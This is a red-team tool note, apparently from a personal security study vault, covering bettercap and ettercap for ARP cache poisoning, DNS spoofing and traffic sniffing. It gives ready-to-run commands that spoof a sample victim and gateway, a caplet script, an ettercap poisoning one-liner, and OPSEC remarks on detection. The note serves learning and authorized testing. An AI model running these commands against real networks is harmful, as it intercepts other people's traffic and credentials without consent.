---
type: tool
room: red
tool_name: "bettercap"
version: "v2.32.x"
platform: [Linux, macOS]
phase: [Credential Access, Lateral Movement]
tags: [red/tool, red/mitm, arp-spoofing, dns-spoofing]
date_added: 2026-10-30
last_reviewed: 2026-10-30
---

# bettercap / ettercap

> [!quote]
> *"When a client and server speak in the dark, the adversary provides the candle."*

**Room:** Red — Instruments | **Phase(s):** `Credential Access, Lateral Movement` | **Platform:** `Linux, macOS`

---

## The Instrument *(What It Is)*

`Bettercap` is the modern Swiss Army knife for network reconnaissance, Layer 2 Man-in-the-Middle (MITM) attacks, ARP cache poisoning, DNS spoofing, and rogue gateway emulation. It replaces legacy tools like `Ettercap`, providing a modular, extensible engine capable of intercepting and manipulating raw network traffic and SSL/TLS proxying.

- **Author / Origin:** Simone Margaritelli (evilsocket)
- **License:** GNU GPL v3
- **Install:** `sudo apt install bettercap ettercap-text-only`

---

## The Method *(Core Usage)*

### Bettercap Invocation Modes
Bettercap provides **3 invocation modes**:
1. **Interactive Mode:** `sudo bettercap -iface <iface>` (launches CLI prompt)
2. **Eval Mode:** `sudo bettercap -iface <iface> -eval "<commands>"` (executes command string and exits)
3. **Caplet Mode:** `sudo bettercap -iface <iface> -caplet <script.cap>` (executes automated scripts)

### Ettercap Interface Modes
Ettercap provides **3 interface options**:
1. Text-only CLI mode: `-T`
2. Ncurses terminal GUI: `-C`
3. GTK graphical GUI: `-G`

---

## The Cases *(Common Use-Patterns)*

### Case 1 — Bettercap Interactive Host Discovery & ARP Spoofing
```bash
# Start Bettercap on target interface
sudo bettercap -iface eth0

# Within Bettercap prompt:
net.probe on                       # Active network probe to discover hosts
net.show                           # Display ARP cache & host table
set arp.spoof.targets 10.10.10.50  # Define victim host
set arp.spoof.internal true        # Poison both target and default gateway
arp.spoof on                       # Start sending gratuitous ARP packets
net.sniff on                       # Start packet sniffing on intercepted flows
```

### Case 2 — Automated MITM via Caplet
```bash
# Save to spoof.cap:
# net.probe on
# set arp.spoof.targets 10.10.10.50
# arp.spoof on
# net.sniff on

sudo bettercap -iface eth0 -caplet spoof.cap
```

### Case 3 — Ettercap CLI Text Mode (`-T`)
```bash
# Perform silent text-mode ARP poisoning between gateway and target
sudo ettercap -T -q -i eth0 -M arp:remote /10.10.10.1// /10.10.10.50//
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name |
|-------------|----------------|
| `T1557` | Adversary-in-the-Middle |
| `T1557.002` | Adversary-in-the-Middle: ARP Cache Poisoning |
| `T1040` | Network Sniffing |

---

## Gotchas & Caveats

> [!warning] Common Mistakes
> - **Kernel IP Forwarding:** If IP forwarding is not enabled (`sysctl -w net.ipv4.ip_forward=1`), ARP poisoning creates a Denial of Service (DoS) rather than a transparent MITM. Bettercap handles this automatically, but Ettercap may require manual activation.
> - **HSTS Enforcement:** Modern browsers will block SSL-stripped connections to domains with preloaded HSTS headers.

---

## OPSEC Notes

- High volume of unsolicited ARP replies is detected immediately by IDS systems and switch security (Dynamic ARP Inspection / DAI).
- When exiting Bettercap, always use `exit` or `q` to allow the tool to restore original ARP mappings to avoid leaving targets disconnected.

---

## Related Notes

- [[Red/Instruments/tcpdump|tcpdump]]
- [[Red/Instruments/wireshark|wireshark / tshark]]
- [[Red/Monographs/TA0006 - Credential Access|TA0006 — Credential Access]]
- [[Casebook/Labs/TryHackMe/THM - Protocols and Servers 2|THM — Protocols and Servers 2]]

↩ [[Red/Instruments/readme|Red: Instruments]] · [[Red/Red|Red]] · [[Mind Palace]]
